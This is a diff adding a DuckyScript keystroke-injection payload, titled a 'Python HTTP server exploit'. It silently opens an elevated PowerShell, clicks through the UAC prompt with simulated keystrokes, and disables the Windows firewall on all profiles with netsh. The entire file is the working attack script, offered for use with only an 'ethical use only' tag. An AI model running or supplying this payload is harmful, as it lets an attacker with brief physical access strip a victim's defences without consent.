@@ -1,0 +1,21 @@
+REM Author: Guereak
+REM /!\ ETHICAL USE ONLY
+REM Python HTTP server exploit
+DELAY 300
+GUI r
+DELAY 100
+STRING powershell -w hidden start-process powershell -verb runas
+DELAY 100
+ENTER
+DELAY 2000
+LEFT_ARROW
+DELAY 100
+ENTER
+DELAY 300
+STRING netsh advfirewall set allprofiles state off
+DELAY 100
+ENTER
+DELAY 200
+STRING exit
+DELAY 100
+ENTER
